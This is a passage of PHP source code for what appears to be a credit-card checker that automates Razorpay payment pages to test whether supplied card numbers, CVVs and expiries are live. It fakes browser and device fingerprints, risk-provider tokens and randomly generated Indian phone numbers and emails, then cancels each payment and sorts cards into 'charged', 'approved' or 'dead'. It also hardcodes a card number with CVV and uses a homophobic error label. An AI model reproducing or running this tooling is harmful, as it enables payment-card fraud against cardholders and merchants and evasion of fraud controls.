                'reason'  => 'gay_site',
            ];
        }

        if ($httpCode === 400 && str_contains($desc, 'payment currency provided does not match')) {
            return [
                'status'  => 'error',
                'message' => 'Currency MisMatch',
                'reason'  => 'currency_mismatch',
            ];
        }

        if ($httpCode === 400 && (
            str_contains($desc, 'amount should be equal to payment page item amount')
            || str_contains($desc, 'payment page item min amount')
        )) {
            return [
                'status'  => 'error',
                'message' => 'Amount too small',
                'reason'  => 'amount_mismatch',
            ];
        }

        if ($httpCode === 401 && str_contains($desc, 'please provide your api key')) {
            return [
                'status'  => 'error',
                'message' => 'Site Change',
                'reason'  => 'site_change',
            ];
        }

        if ($httpCode === 400 && str_contains($desc, 'international cards are not supported')) {
            return [
                'status'  => 'dead',
                'message' => 'International not support',
                'reason'  => 'international_not_supported',
            ];
        }

        if ($httpCode === 400 && str_contains($desc, 'temporary block placed on the account')) {
            return [
                'status'  => 'error',
                'message' => 'Merchant Blocked',
                'reason'  => 'merchant_blocked',
            ];
        }

        if ($httpCode === 400 && str_contains($desc, 'payment page which is not active')) {
            return [
                'status'  => 'error',
                'message' => 'Payment Page Inactive',
                'reason'  => 'payment_page_inactive',
            ];
        }

        if ($httpCode === 400 && str_contains($desc, 'is mandatory payment page item')) {
            return [
                'status'  => 'error',
                'message' => 'Mandatory Item',
                'reason'  => 'mandatory_item',
            ];
        }

        if ($httpCode === 400 && str_contains($desc, 'authentication failed')) {
            return [
                'status'  => 'error',
                'message' => 'Auth Required',
                'reason'  => 'auth_required',
            ];
        }

        if ($httpCode === 400 && str_contains($desc, 'make live request when not activated')) {
            return [
                'status'  => 'error',
                'message' => 'Merchant Not Activated',
                'reason'  => 'merchant_not_activated',
            ];
        }

        if ($httpCode === 400 && str_contains($desc, 'email field is invalid')) {
            return [
                'status'  => 'error',
                'message' => 'Invalid Email',
                'reason'  => 'invalid_email',
            ];
        }

        if ($httpCode === 400 && str_contains($desc, 'should not be sent')) {
            return [
                'status'  => 'error',
                'message' => 'Site Change',
                'reason'  => 'extra_field_sent',
            ];
        }

        // HTTP 400 + SERVER_ERROR code = Razorpay gateway crash on valid request (all retries done)
        $errCode = strtoupper((string) ($payload['error']['code'] ?? ''));
        if ($httpCode === 400 && $errCode === 'SERVER_ERROR') {
            return [
                'status'  => 'dead',
                'message' => 'Declined (Gateway Error)',
                'reason'  => 'server_error_400',
            ];
        }

        return self::outcomeFromCreatePaymentResponse($httpCode, $response, $reason, $desc);
    }

    /**
     * Map Razorpay payments/create/ajax 400/500 errors to checker outcomes.
     *
     * @return array{status: string, message: string, reason: string}|null
     */
    private static function outcomeFromCreatePaymentResponse(
        int $httpCode,
        string $response,
        ?string $reason = null,
        ?string $desc = null
    ): ?array {
        $payload = json_decode($response, true);
        if (!is_array($payload)) {
            return null;
        }

        if ($reason === null) {
            $reason = (string) ($payload['error']['reason'] ?? '');
        }
        if ($desc === null) {
            $desc = strtolower((string) ($payload['error']['description'] ?? ''));
        }

        if ($httpCode === 400 && $reason === 'card_number_invalid') {
            return [
                'status'  => 'dead',
                'message' => 'Invalid Card Number',
                'reason'  => 'card_number_invalid',
            ];
        }

        if ($httpCode === 400 && $reason === 'card_network_not_enabled') {
            return [
                'status'  => 'dead',
                'message' => 'This Type OF CArd Is Not Supported By MErchant',
                'reason'  => 'card_network_not_enabled',
            ];
        }

        // HTTP 500 + server_error reason = Razorpay server down (all retries done)
        if ($httpCode === 500 && $reason === 'server_error') {
            return [
                'status'  => 'dead',
                'message' => 'Declined (Server Down)',
                'reason'  => 'server_error_500',
            ];
        }

        // HTTP 400 or 500 + SERVER_ERROR code = safety net (all retries done)
        $errCodeCreate = strtoupper((string) ($payload['error']['code'] ?? ''));
        if ($errCodeCreate === 'SERVER_ERROR') {
            $msg = ($httpCode === 500) ? 'Declined (Server Down)' : 'Declined (Gateway Error)';
            return [
                'status'  => 'dead',
                'message' => $msg,
                'reason'  => 'server_error_' . $httpCode,
            ];
        }

        return null;
    }

    /** @return array{status: string, message: string, reason: string}|null */
    private static function outcomeFromRunError(string $runError): ?array
    {
        $jsonStart = strpos($runError, '{');
        if ($jsonStart === false) {
            return null;
        }

        $httpCode = 0;
        if (preg_match('/HTTP\s+(\d{3})/', $runError, $m)) {
            $httpCode = (int) $m[1];
        }

        return self::outcomeFromApiError($httpCode, substr($runError, $jsonStart));
    }



    private function authenticate3ds(): void
    {
        $paymentId = $this->tokens['payment_id'] ?? '';
        if ($paymentId === '') {
            throw new RuntimeException('payment_id missing â€” cannot run 3DS authenticate');
        }

        $base         = self::API_BASE;
        $pidClean     = str_starts_with($paymentId, 'pay_') ? substr($paymentId, 4) : $paymentId;
        $authUrlFull  = "{$base}/pg_router/v1/payments/{$paymentId}/authenticate";
        $authUrlShort = "{$base}/pg_router/v1/payments/{$pidClean}/authenticate";
        $authHeaders  = $this->pgRouterAuthHeaders();

        try {
            $this->request('POST', $authUrlFull, $authHeaders, '', false);
            $this->log('  3DS_auth_empty: OK');
        } catch (Throwable $e) {
            $this->log('  3DS_auth_empty: SKIP â€” ' . substr($e->getMessage(), 0, 120));
        }

        usleep(400_000);

        $browserData = http_build_query([
            'browser[java_enabled]'      => 'false',
            'browser[javascript_enabled]' => 'true',
            'browser[timezone_offset]' => '0',
            'browser[color_depth]'     => $this->profile['color_depth'] ?? '24',
            'browser[screen_width]'    => $this->profile['screen_width'] ?? '1920',
            'browser[screen_height]'   => $this->profile['screen_height'] ?? '1080',
            'browser[language]'        => $this->profile['language'] ?? 'en-US',
            'auth_step'                => '3ds2Auth',
        ], '', '&', PHP_QUERY_RFC3986);

        $body = $this->request('POST', $authUrlShort, $authHeaders, $browserData, false);
        $this->log('  3DS_auth_browser: OK (' . strlen($body) . ' bytes)');
        $this->tokens['3ds_auth_response'] = $body;
    }

    private function cancelPayment(): void
    {
        $paymentId = $this->tokens['payment_id'] ?? '';
        if ($paymentId === '') {
            throw new RuntimeException('payment_id missing â€” cannot cancel');
        }

        $url = self::API_BASE . '/v1/standard_checkout/payments/' . rawurlencode($paymentId)
            . '/cancel?' . $this->checkoutAuthQuery();

        $raw = $this->request('GET', $url, $this->checkoutApiFormHeaders(), null, false);
        $this->tokens['cancel_response_raw'] = $raw;
        $this->tokens['cancel_http_code']    = $this->lastHttpCode;
    }

    /** @return array{status: string, message: string, reason: string} */
    private function classifyOutcome(): array
    {
        if ($this->forcedOutcome !== null) {
            return $this->forcedOutcome;
        }

        if ($this->runError !== null) {
            $fromCreate = self::outcomeFromRunError($this->runError);
            if ($fromCreate !== null) {
                return $fromCreate;
            }

            return [
                'status'  => 'error',
                'message' => $this->runError,
                'reason'  => 'run_exception',
            ];
        }

        $createCode = (int) ($this->tokens['create_http_code'] ?? 0);
        $createRaw  = (string) ($this->tokens['create_response_raw'] ?? '');
        if ($createCode === 400 || $createCode === 500) {
            $fromCreate = self::outcomeFromApiError($createCode, $createRaw);
            if ($fromCreate !== null) {
                return $fromCreate;
            }
        }

        $missing = $this->missingRequiredTokens();
        if ($missing !== []) {
            return [
                'status'  => 'error',
                'message' => 'Missing tokens: ' . implode(', ', $missing),
                'reason'  => 'missing_tokens',
            ];
        }

        $text = (string) ($this->tokens['cancel_response_raw'] ?? '');
        $low  = strtolower($text);
        $payload = $this->parseJson($text);

        if (is_array($payload)) {
            if (!empty($payload['razorpay_payment_id']) || !empty($payload['razorpay_signature'])) {
                $pid = (string) ($payload['razorpay_payment_id'] ?? $this->tokens['payment_id'] ?? '');
                if ($pid !== '') {
                    $this->tokens['payment_id'] = $pid;
                }
                return [
                    'status'  => 'charged',
                    'message' => 'Payment Successfully',
                    'reason'  => 'charged',
                ];
            }
        }

        if (str_contains($low, 'razorpay_payment_id') || str_contains($low, 'razorpay_signature')) {
            if (preg_match('/pay_[A-Za-z0-9]+/i', $text, $m)) {
                $this->tokens['payment_id'] = $m[0];
            }
            return [
                'status'  => 'charged',
                'message' => 'Payment Successfully',
                'reason'  => 'charged',
            ];
        }

        $createRaw = (string) ($this->tokens['create_response_raw'] ?? '');
        $createPayload = $this->parseJson($createRaw);
        if (is_array($createPayload)) {
            $payId = $createPayload['payment_id'] ?? null;
            $isRedirect = ($createPayload['redirect'] ?? false) === true
                || ($createPayload['type'] ?? '') === 'redirect';
            if ($payId && $isRedirect && empty($text)) {
                return [
                    'status'  => 'approved',
                    'message' => '3DS/OTP required (' . $payId . ')',
                    'reason'  => '3ds_required',
                ];
            }
        }

        $err  = is_array($payload['error'] ?? null) ? $payload['error'] : [];
        $desc = trim(str_replace(
            [' Try another payment method or contact your bank for details.', 'Try another payment method or contact your bank for details.'],
            '',
            (string) ($err['description'] ?? '')
        ));
        $reason = (string) ($err['reason'] ?? '');
        $msgLower = strtolower($desc);
        $cancelCode = (int) ($this->tokens['cancel_http_code'] ?? 0);

        if ($cancelCode >= 500) {
            return ['status' => 'error', 'message' => $desc ?: 'upstream_5xx', 'reason' => 'rzp_5xx'];
        }

        if ($cancelCode === 403 && (str_contains($low, 'forbidden') || str_contains($low, '<html>'))) {
            return ['status' => 'error', 'message' => 'payments_ajax_waf_403', 'reason' => 'ajax_waf_403'];
        }

        $liveLimitKw = ['insufficient account balance', 'maximum transaction limit', 'insufficient funds'];
        foreach ($liveLimitKw as $kw) {
            if (str_contains($msgLower, $kw)) {
                return [
                    'status'  => 'approved',
                    'message' => trim("{$desc} ({$reason})"),
                    'reason'  => 'live_limit',
                ];
            }
        }

        if (str_contains($msgLower, 'cvv') && (str_contains($msgLower, 'incorrect') || str_contains($msgLower, 'invalid'))) {
            return [
                'status'  => 'approved',
                'message' => 'CCN - ' . trim("{$desc} ({$reason})"),
                'reason'  => 'ccn',
            ];
        }

        $ambKw = ['otp', '3ds', 'authentication', 'redirect', 'challenge'];
        foreach ($ambKw as $kw) {
            if (str_contains($msgLower, $kw) || str_contains($low, $kw)) {
                return [
                    'status'  => 'approved',
                    'message' => $desc ?: 'needs_customer_step',
                    'reason'  => '3ds_or_otp',
                ];
            }
        }

        $deadKw = [
            'declined', 'rejected', 'invalid cvv', 'incorrect cvv', 'insufficient funds',
            'stolen', 'lost card', 'pick up', 'expired', 'authentication failed',
            'do not honour', 'not permitted', 'restricted card', 'closed account',
            'invalid card', 'incorrect_number', 'not supported', 'card type not supported',
            'not enabled', 'not accepted', 'payment has been cancelled', 'your payment didn',
            'card_declined',
        ];
        foreach ($deadKw as $kw) {
            if (str_contains($msgLower, $kw)) {
                return [
                    'status'  => 'dead',
                    'message' => trim("{$desc} ({$reason})") ?: 'card_declined',
                    'reason'  => 'declined',
                ];
            }
        }

        $liveKw = ['captured', 'authorized', '"id":"pay_'];
        foreach ($liveKw as $kw) {
            if (str_contains($low, $kw)) {
                return ['status' => 'approved', 'message' => 'approved_or_captured', 'reason' => 'ok'];
            }
        }

        if ($desc !== '') {
            return ['status' => 'dead', 'message' => trim("{$desc} ({$reason})"), 'reason' => 'declined_other'];
        }

        $pid = (string) ($this->tokens['payment_id'] ?? '');
        if ($pid !== '') {
            return ['status' => 'dead', 'message' => "3DS required ({$pid}) no_cancel_detail", 'reason' => '3ds_no_detail'];
        }

        return ['status' => 'error', 'message' => 'unclassified_response', 'reason' => 'unclassified'];
    }

    /** @return list<string> */
    private function missingRequiredTokens(): array
    {
        $required = [
            'session_token'   => 'session_token',
            'payment_link_id' => 'payment_link_id',
            'order_id'        => 'order_id',
            'payment_id'      => 'payment_id',
        ];
        $missing = [];
        foreach ($required as $key => $label) {
            if (empty($this->tokens[$key])) {
                $missing[] = $label;
            }
        }
        return $missing;
    }

    /** @return array<string, mixed> */
    private function buildFinalResult(): array
    {
        $outcome = $this->classifyOutcome();
        $elapsed = microtime(true) - $this->startTime;

        $result = [
            'card'       => $this->formatCardLine(),
            'status'     => $outcome['status'],
            'message'    => $outcome['message'],
            'site'       => $this->paymentPageUrl,
            'time_taken' => sprintf('%.2fs', $elapsed),
            'dev'        => '@Mod_By_Assassin',
        ];

        // Debug mode: ?debug=1 — shows raw Razorpay responses to diagnose SERVER_ERROR
        $isDebug = (isset($_GET['debug']) && $_GET['debug'] === '1')
            || getenv('RAZORPAY_DEBUG') === '1';
        if ($isDebug) {
            $rawResp = $this->tokens['create_response_raw'] ?? '';
            $decoded = json_decode($rawResp, true);
            $result['_debug'] = [
                'payment_create_http'   => $this->tokens['create_http_code'] ?? null,
                'payment_create_error'  => $decoded['error'] ?? $rawResp,
                'order_id'              => $this->tokens['order_id'] ?? '',
                'key_id'                => $this->tokens['key_id'] ?? '',
                'payment_link_id'       => $this->tokens['payment_link_id'] ?? '',
                'session_token_present' => !empty($this->tokens['session_token']),
                'shield_context_len'    => strlen($this->tokens['shield_context'] ?? ''),
                'preferences_error'     => $this->tokens['preferences_error'] ?? null,
                'order_currency'        => $this->orderCurrency(),
                'page_auth_mode'        => $this->tokens['page_auth_mode'] ?? 'unknown',
                'traffic_env'           => $this->tokens['traffic_env'] ?? 'unknown',
                'track_id'              => $this->tokens['rzp_track_id'] ?? '',
                'payment_create_referer'=> $this->checkoutPublicUrl(false),
                'build_number'          => $this->tokens['build_number'] ?? '',
                'commit_hash'           => substr($this->tokens['commit_hash'] ?? '', 0, 12),
                'create_sent_headers'   => $this->tokens['create_sent_headers'] ?? '',
                'create_http_version'   => $this->tokens['create_http_version'] ?? '',
                'create_tls_version'    => $this->tokens['create_tls_version'] ?? '',
                'create_body_keys'      => $this->tokens['create_body_keys'] ?? '',
                'create_body_len'       => $this->tokens['create_body_len'] ?? '',
                'cookie_count'          => (function () {
                    $hdrs = $this->tokens['create_sent_headers'] ?? '';
                    if (preg_match('/\r\nCookie:\s*([^\r\n]+)/i', $hdrs, $m)) {
                        return substr_count(trim($m[1]), ';') + 1;
                    }
                    return 0;
                })(),
                'run_error'             => $this->runError,
            ];
        }

        return $result;
    }

    private function formatCardLine(): string
    {
        $year = $this->card['expiry_year'] ?? '';
        if (strlen($year) === 2) {
            $year = '20' . $year;
        }

        return sprintf(
            '%s|%s|%s|%s',
            $this->card['number'] ?? '',
            $this->card['expiry_month'] ?? '',
            $year,
            $this->card['cvv'] ?? ''
        );
    }

    /** @return array<string, mixed>|null */
    private function parseJson(string $text): ?array
    {
        $text = trim($text);
        if ($text === '' || !str_starts_with($text, '{')) {
            return null;
        }
        try {
            $decoded = json_decode($text, true, 512, JSON_THROW_ON_ERROR);
            return is_array($decoded) ? $decoded : null;
        } catch (JsonException) {
            return null;
        }
    }

    private function pgRouterAuthHeaders(): array
    {
        return [
            'Content-Type: application/x-www-form-urlencoded',
            'User-Agent: ' . ($this->profile['user_agent'] ?? ''),
            'Accept: */*',
            'Connection: keep-alive',
        ];
    }

    private function orderCurrency(): string
    {
        return strtoupper((string) ($this->tokens['currency'] ?? 'INR'));
    }

    /** Razorpay checkout.js-style metadata for payments/create/ajax */
    private function buildPaymentCreateBody(bool $includeCheckoutId = false): string
    {
        $this->ensureCustomerDetails();

        $deviceId   = $this->tokens['rzp_device_id'] ?? '';
        $checkoutId = $this->tokens['checkout_id'] ?? '';
        $fhash      = $this->rtbDeviceId();
        $shieldTz   = (string) abs((int) ($this->profile['timezone_offset'] ?? 330));

        $riskToken = base64_encode(json_encode([
            [
                'name'     => 'sardine',
                'metadata' => ['session_id' => $checkoutId],
            ],
        ], JSON_THROW_ON_ERROR));

        // Build base payment body — only include fields with non-empty values.
        // Razorpay backend crashes (HTTP 400 SERVER_ERROR) when unexpected empty-string
        // fields like key_id="" or _[shield_context]="" are present in the payload.
        $meta = [
            'contact'                    => $this->tokens['contact'],
            'email'                      => $this->tokens['email'],
            'currency'                   => $this->orderCurrency(),
            '_[checkout_id]'            => $checkoutId,
            '_[device.id]'              => $deviceId,
            '_[library]'                => 'checkoutjs',
            '_[library_src]'            => 'no-src',
            '_[current_script_src]'     => 'no-src',
            '_[platform]'               => 'browser',
            '_[is_magic_script]'        => 'false',
            '_[os]'                     => 'windows',
            '_[referer]'                => $this->paymentReferer,
            '_[shield][fhash]'          => $fhash,
            '_[shield][tz]'             => $shieldTz,
            '_[device_id]'              => $deviceId,
            '_[build]'                  => $this->tokens['build_number'] ?? '26589118452',
            '_[request_index]'          => '0',  // Chrome starts at 0 on first payment attempt
            '_[feat]'                   => '',   // Real checkout.js always sends this (empty on first request)
            'amount'                    => (string) ($this->tokens['order_amount'] ?? $this->amountPaise),
            'order_id'                  => $this->tokens['order_id'] ?? '',
            'user_risk_providers_token' => $riskToken,
            'method'                    => 'card',
            'card[number]'              => $this->card['number'],
            'card[cvv]'                 => $this->card['cvv'],
            'card[name]'                => $this->card['name'],
            'card[expiry_month]'        => $this->card['expiry_month'],
            'card[expiry_year]'         => $this->card['expiry_year'],
            'save'                      => '0',
        ];

        // Only add optional fields when non-empty — empty strings crash Razorpay backend
        $keyId = trim($this->tokens['key_id'] ?? '');
        if ($keyId !== '') {
            $meta['key_id'] = $keyId;
        }

        $plId = trim($this->tokens['payment_link_id'] ?? '');
        // Only send payment_link_id for ppl_ (Payment Page) sites.
        // pl_ (Payment Link) sites — pages.razorpay.com/pl_* — crash with HTTP 400
        // SERVER_ERROR when payment_link_id is present in the payment body.
        // Real checkout.js does NOT send payment_link_id for pl_ payment links.
        if ($plId !== '' && str_starts_with($plId, 'ppl_')) {
            $meta['payment_link_id'] = $plId;
        }

        $comment = trim($this->orderComment);
        if ($comment !== '') {
            $meta['notes[comment]'] = $comment;
        }

        // shield_context: only send if non-empty — empty string causes SERVER_ERROR
        $shieldCtx = trim($this->tokens['shield_context'] ?? '');
        if ($shieldCtx !== '') {
            $meta['_[shield_context]'] = $shieldCtx;
        }

        if ($includeCheckoutId && $checkoutId !== '') {
            $meta['checkout_id'] = $checkoutId;
        }

        // DCC fields intentionally omitted — currency_request_id + dcc_currency cause SERVER_ERROR
        return http_build_query($meta, '', '&', PHP_QUERY_RFC3986);
    }

    /** SHA1 segment from rzp_device_id (1.{hash}.{ts}.{rand}) */
    private function rtbDeviceId(): string
    {
        $parts = explode('.', $this->tokens['rzp_device_id'] ?? '');
        return $parts[1] ?? '';
    }

    /** Default test card; override via RAZORPAY_CARD_* env. */
    private static function defaultTestCard(): array
    {
        $defaults = [
            'number'       => '4232232074972432',
            'cvv'          => '830',
            'name'         => 'Test User',
            'expiry_month' => '11',
            'expiry_year'  => '26',
        ];

        $number = getenv('RAZORPAY_CARD_NUMBER');
        if ($number !== false && $number !== '') {
            return [
                'number'       => $number,
                'cvv'          => getenv('RAZORPAY_CARD_CVV') ?: $defaults['cvv'],
                'name'         => getenv('RAZORPAY_CARD_NAME') ?: $defaults['name'],
                'expiry_month' => getenv('RAZORPAY_CARD_EXP_MONTH') ?: $defaults['expiry_month'],
                'expiry_year'  => getenv('RAZORPAY_CARD_EXP_YEAR') ?: $defaults['expiry_year'],
            ];
        }

        return $defaults;
    }

    private function extractSessionToken(string $html): void
    {
        if (preg_match('/window\.session_token\s*=\s*"([^"]+)"/', $html, $m)) {
            $this->tokens['session_token'] = $m[1];
            $this->logToken('session_token', $m[1]);
            return;
        }

        throw new RuntimeException('session_token not found in checkout/public response');
    }

    private function fetchCheckoutPublic(): string
    {
        $url = $this->checkoutPublicUrl(false);
        return $this->request('GET', $url, $this->iframeHeaders());
    }

    private function createOrder(): void
    {
        $plId = $this->tokens['payment_link_id'] ?? '';
        if ($plId === '') {
            $this->forcedOutcome = [
                'status'  => 'error',
                'message' => 'Gay Site',
                'reason'  => 'gay_site',
            ];
            $this->log('  create order outcome: Gay Site');
            return;
        }

        $lineItems = $this->tokens['order_line_items'] ?? [[
            'payment_page_item_id' => $this->tokens['ppi_id'] ?? '',
            'amount'               => $this->amountPaise,
        ]];

        $body           = '';
        $httpCode       = 500;
        $authUsed       = [];
        $rejectedFields = [];
        $bestFailure    = null;

        foreach ($this->orderAuthSequence() as $auth) {
            if ($rejectedFields !== [] && self::orderAuthUsesRejectedField($auth, $rejectedFields)) {
                continue;
            }

            $response = $this->submitPaymentPageOrder($lineItems, $auth);
            $body     = $response['body'];
            $httpCode = $response['http_code'];
            $authUsed = $auth;

            if ($httpCode < 400) {
                break;
            }

            if (empty($auth['session_token']) && empty($auth['header_session'])) {
                $bestFailure = ['body' => $body, 'http_code' => $httpCode, 'auth' => $auth];
            }

            if ($httpCode >= 400
                && preg_match('/(ppi_[A-Za-z0-9]+)\s+is mandatory payment page item/i', $body, $mandatoryMatch)) {
                $mandatoryPpi = $mandatoryMatch[1];
                $retryItems   = $this->orderLineItemsWithMandatoryPpi($mandatoryPpi);
                if (!$this->orderLineItemsIncludePpi($lineItems, $mandatoryPpi)
                    || count($lineItems) !== 1) {
                    $this->log('  retry order with mandatory ppi: ' . $mandatoryPpi);
                    $lineItems = $retryItems;
                    $response  = $this->submitPaymentPageOrder($lineItems, $auth);
                    $body      = $response['body'];
                    $httpCode  = $response['http_code'];
                    if ($httpCode < 400) {
                        break;
                    }
                }
            }

            if (!self::orderCreateShouldTryNextAuth($body)) {
                break;
            }

            $rejectedFields = array_values(array_unique(array_merge(
                $rejectedFields,
                self::orderCreateRejectedAuthFields($body)
            )));
            $this->log('  retry order with different auth');
        }

        if ($httpCode >= 400 && $bestFailure !== null && self::orderCreateRejectedAuthFields($body) !== []) {
            $body     = $bestFailure['body'];
            $httpCode = $bestFailure['http_code'];
            $authUsed = $bestFailure['auth'];
        }

        if ($httpCode >= 400) {
            $outcome = self::outcomeFromApiError($httpCode, $body);
            if ($outcome !== null) {
                $this->forcedOutcome = $outcome;
                $this->log('  create order outcome: ' . $outcome['message']);
                return;
            }
            throw new RuntimeException(
                "HTTP {$httpCode} for {$this->paymentPageOrderUrl($plId, $authUsed)}: " . substr($body, 0, 500)
            );
        }

        $data = json_decode($body, true, 512, JSON_THROW_ON_ERROR);

        $this->tokens['order_id']      = $data['order']['id'] ?? '';
        $this->tokens['line_item_id']  = $data['line_items'][0]['id'] ?? '';
        $this->tokens['order_amount']  = (string) ($data['order']['amount'] ?? $this->amountPaise);
        $this->tokens['order_line_items'] = $lineItems;

        $orderCurrency = (string) ($data['order']['currency'] ?? '');
        if ($orderCurrency !== '') {
            $this->tokens['currency'] = strtoupper($orderCurrency);
            $this->logToken('currency', $this->tokens['currency']);
        }

        $this->logToken('order_id', $this->tokens['order_id']);
        $this->logToken('line_item_id', $this->tokens['line_item_id']);
    }

    private function encryptPrefill(): void
    {
        $this->ensureCustomerDetails();
        $contact = $this->tokens['contact'];
        $email   = $this->tokens['email'];
        $this->logToken('contact', $contact);
        $this->logToken('email', $email);

        try {
            $url = self::API_BASE . '/v1/standard_checkout/checkout/prefill/encrypt?' . $this->checkoutAuthQuery();

            $body = $this->requestJson('POST', $url, $this->checkoutApiHeaders(true), [
                'contact' => $contact,
                'email'   => $email,
            ]);

            $data = json_decode($body, true, 512, JSON_THROW_ON_ERROR);
            $prefill = $data['prefill_data_v1'] ?? '';
            if ($prefill !== '') {
                $this->tokens['prefill_data_v1'] = $prefill;
                $this->setApiCookie('prefill_data_v1', $prefill, 3600);
                $this->logToken('prefill_data_v1', $prefill);
            }
        } catch (Throwable $e) {
            $this->log('  prefill encrypt skip: ' . substr($e->getMessage(), 0, 120));
        }
    }

    private function ensureCustomerDetails(): void
    {
        $contact = trim((string) ($this->tokens['contact'] ?? ''));
        if ($contact === '' || !preg_match('/^\+91[6-9]\d{9}$/', $contact)) {
            $contact = self::generateIndianMobile();
            $this->tokens['contact'] = $contact;
        }

        $email = trim((string) ($this->tokens['email'] ?? ''));
        if ($email === '' || !filter_var($email, FILTER_VALIDATE_EMAIL)) {
            $email = self::generateEmail();
            $this->tokens['email'] = $email;
        }
    }

    private function lookupIin(): void
    {
        $iin = substr($this->card['number'], 0, 9);
        $url = self::API_BASE . '/v1/standard_checkout/payment/iin?' . $this->checkoutEntityQuery([
            'iin' => $iin,
        ]);

        $body = $this->request('GET', $url, $this->checkoutApiHeaders(false), null, false);

        if ($this->lastHttpCode >= 400) {
            $outcome = self::outcomeFromApiError($this->lastHttpCode, $body);
            if ($outcome !== null) {
                $this->forcedOutcome = $outcome;
                $this->log('  iin lookup outcome: ' . $outcome['message']);
                return;
            }
            throw new RuntimeException(
                "HTTP {$this->lastHttpCode} for {$url}: " . substr($body, 0, 500)
            );
        }

        $data = json_decode($body, true, 512, JSON_THROW_ON_ERROR);

        $this->tokens['card_type']     = $data['type'] ?? '';
        $this->tokens['card_network']  = $data['network'] ?? '';
        $this->tokens['card_country']  = $data['country'] ?? '';
        $this->tokens['bin_currency']  = $data['bin_currency'] ?? '';
        $this->tokens['issuer_name']   = $data['issuer_name'] ?? '';
        $this->tokens['dcc_blacklisted'] = isset($data['dcc_blacklisted'])
            ? ($data['dcc_blacklisted'] ? 'true' : 'false')
            : 'false';

        foreach (['card_type', 'card_network', 'card_country', 'bin_currency', 'issuer_name'] as $k) {
            $this->logToken($k, $this->tokens[$k] ?? '');
        }
    }

    private function fetchCbFlows(): void
    {
        // Skip DCC/cb_flows entirely — NEVER send currency_request_id or dcc_currency in payment body.
        // For INR sites: DCC fields cause HTTP 400 SERVER_ERROR on international cards.
        // For USD sites (e.g. fopenfoall): order currency is already USD — no DCC needed.
        // The payment body will just send currency=orderCurrency() with no DCC wrapper.
        $this->log('  fetchCbFlows: skipped (DCC fields never sent — avoids SERVER_ERROR)');
        return;

        $url = self::CB_FLOWS . '?' . $this->checkoutEntityQuery([], false);

        $payload = [
            'identifiers' => [
                'merchant' => ['country' => 'IN'],
                'card'     => [
                    'country'          => $this->tokens['card_country'] ?? 'US',
                    'dcc_blacklisted'  => ($this->tokens['dcc_blacklisted'] ?? 'false') === 'true',
                    'network'          => $this->tokens['card_network'] ?? 'MasterCard',
                    'currency'         => $this->tokens['bin_currency'] ?? 'USD',
                ],
                'method'           => 'card',
                'payment_currency' => $this->orderCurrency(),
            ],
            'forex_charges' => [
                'amount'   => (int) ($this->tokens['order_amount'] ?? $this->amountPaise),
                'currency' => $this->orderCurrency(),
                'filters'  => ['method' => 'card'],
            ],
        ];

        $body = $this->requestJson('POST', $url, $this->checkoutApiHeaders(true), $payload);
        $data = json_decode($body, true, 512, JSON_THROW_ON_ERROR);

        $forexId = $data['forex_charges']['id'] ?? '';
        if ($forexId !== '') {
            $this->tokens['forex_charges_id']    = $forexId;
            $this->tokens['currency_request_id'] = $forexId;
            $allCurrencies = $data['forex_charges']['all_currencies'] ?? [];

            // Always pay in order currency (INR) — never pick the card's foreign currency (USD etc.)
            // Picking USD as dcc_currency on an INR site causes SERVER_ERROR on payment create
            $orderCur = $this->orderCurrency(); // e.g. "INR"
            if (is_array($allCurrencies) && isset($allCurrencies[$orderCur])) {
                // Order currency is available in DCC list → use it (pay in INR)
                $this->tokens['dcc_currency'] = $orderCur;
            } elseif (is_array($allCurrencies) && $allCurrencies !== []) {
                // Order currency not in list — pick it anyway to avoid foreign currency DCC
                $this->tokens['dcc_currency'] = $orderCur;
            }

            $this->logToken('forex_charges_id / currency_request_id', $forexId);
            if (!empty($this->tokens['dcc_currency'])) {
                $this->logToken('dcc_currency', $this->tokens['dcc_currency']);
            }
        }
    }

    private function seedCheckoutCookies(): void
    {
        $fp = hash('sha256', ($this->tokens['rzp_device_id'] ?? '') . '|' . ($this->profile['user_agent'] ?? ''));
        $this->tokens['user_fingerprint_v2'] = $fp;
        $this->setApiCookie('user_fingerprint_v2', $fp, 86400 * 30);
        $this->setApiCookie('testcookie', '1', 86400);
    }

    /** Indian mobile: +91[6-9]XXXXXXXXX */
    public static function generateIndianMobile(): string
    {
        $first = (string) random_int(6, 9);
        $rest  = '';
        for ($i = 0; $i < 9; $i++) {
            $rest .= (string) random_int(0, 9);
        }
        return '+91' . $first . $rest;
    }

    public static function generateEmail(): string
    {
        $first = ['john', 'alex', 'sam', 'mike', 'david', 'rahul', 'amit', 'priya', 'neha', 'rohan'];
        $local = $first[array_rand($first)] . random_int(100, 9999);

        return strtolower($local . '@gmail.com');
    }

    private function checkoutPublicUrl(bool $withSessionToken): string
    {
        // Razorpay checkout.js minified builds use "prod", not "production".
        // Fallback: "prod" for live sites (checkout.js auto-detects in real browser).
        $trafficEnv = $this->tokens['traffic_env'] ?? 'prod';
        $params = [
            'traffic_env'        => $trafficEnv,
            'build'              => $this->tokens['commit_hash'] ?? '',
            'build_v1'           => $this->tokens['build_v1'] ?? '',
            'checkout_v2'        => '1',
            'new_session'        => '1',
            'unified_session_id' => $this->tokens['unified_session_id'] ?? '',
        ];

        if ($withSessionToken && !empty($this->tokens['session_token'])) {
            $params['session_token'] = $this->tokens['session_token'];
        }

        return self::CHECKOUT_PUBLIC . '?' . http_build_query($params);
    }

    /** Keyless checkout entity query (iin, preferences, cb_flows) â€” no empty key_id. */
    private function checkoutEntityQuery(array $extra = [], bool $withSession = true): string
    {
        $params = [];

        if ($withSession && !empty($this->tokens['session_token'])) {
            $params['session_token'] = $this->tokens['session_token'];
        }

        $orderId = $this->tokens['order_id'] ?? '';
        if ($orderId !== '') {
            $params['x_entity_id'] = $orderId;
        }

        $kh = trim($this->tokens['keyless_header'] ?? '');
        if ($kh !== '') {
            $params['keyless_header'] = $kh;
        }

        return http_build_query(array_merge($params, $extra));
    }

    private function checkoutAuthQuery(array $extra = []): string
    {
        $params = [];

        $keyId = trim($this->tokens['key_id'] ?? '');
        if ($keyId !== '') {
            $params['key_id'] = $keyId;
        }

        if (!empty($this->tokens['session_token'])) {
            $params['session_token'] = $this->tokens['session_token'];
        }

        $kh = trim($this->tokens['keyless_header'] ?? '');
        if ($kh !== '') {
            $params['keyless_header'] = $kh;
        }

        return http_build_query(array_merge($params, $extra));
    }

    private function paymentPageOrigin(): string
    {
        $host = parse_url($this->paymentPageUrl, PHP_URL_HOST) ?: 'razorpay.me';

        return 'https://' . $host;
    }

    private function checkoutApiFormHeaders(): array
    {
